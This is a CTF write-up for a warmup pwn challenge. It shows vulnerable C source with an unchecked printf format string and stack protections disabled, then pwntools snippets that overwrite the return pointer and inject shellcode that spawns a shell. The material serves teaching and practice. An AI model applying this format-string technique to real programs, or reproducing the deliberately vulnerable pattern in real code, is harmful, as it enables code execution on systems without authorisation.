# nothing more to say 2020

## General

This was a warmup challenge and so the challenge creators decided to provide us with the challenge source code and tell us what the vulnerability is:

```c
// gcc -fno-stack-protector -no-pie -z execstack
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void init_proc() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    setbuf(stderr, NULL);
}

void read_string(char* buf, size_t length) {
    ssize_t n;
    n = read(STDIN_FILENO, buf, length);
    if (n == -1)
        exit(1);
    buf[n] = '\0';
}

int main(void) {
    char buf[0x100]; 
    init_proc();
    printf("Hello CTF Players!\nThis is a warmup challenge for pwnable.\nDo you know about Format String Attack(FSA) and write the exploit code?\nPlease pwn me!\n");
    while (1) {
        printf("> ");
        read_string(buf, 0x100);
        if (buf[0] == 'q')
            break;
        printf(buf);
    }
    return 0;
}
```

The code is very simple, there's a main loop, that reads in up to `0x100` characters from `stdin` into a `0x100` bytes buffer and directly passes that buffer as the first argument to `printf()`. This makes the program prone to a Format String Attack(FSA). 

Another interesting detail is, that the program has been compiled with `gcc -fno-stack-protector -no-pie -z execstack`. These flags will disable a range of exploit mitigations, which simplifies exploiting this vulnerability by a lot. 

## Exploit

This setup enables us to use very basic techniques to exploit the vulnerability. Our plan is to use the FSA to 

1. leak a stack address, 
2. write shellcode to the stack and finally 
3. overwrite a return pointer on the stack to point to our shellcode

This can be easily automated using the python `pwntools` package. First, we build a function to send arbitrary formatstrings to the program:
```python
def send_format(fmt):
    s.writeline(fmt)
    return s.readuntil(b"> ", drop=True)
```

Then, we overwrite the return pointer of the main stackframe to point to a buffer using pwntools' `FmtStr` helper functions:
```python
    f = pwn.FmtStr(send_format)
    f.write(main_return, buffer_addr)
    f.execute_writes()
```

and finally, we write our shellcode to that buffer:

```python
s.writeline(b"\x90"*0x30+pwn.asm(pwn.shellcraft.sh()))
```

All that's left to do now it to send the `q` command, which will trigger a return from the main function, which in return will fetch our corrupted return pointer, giving us arbitrary code execution.

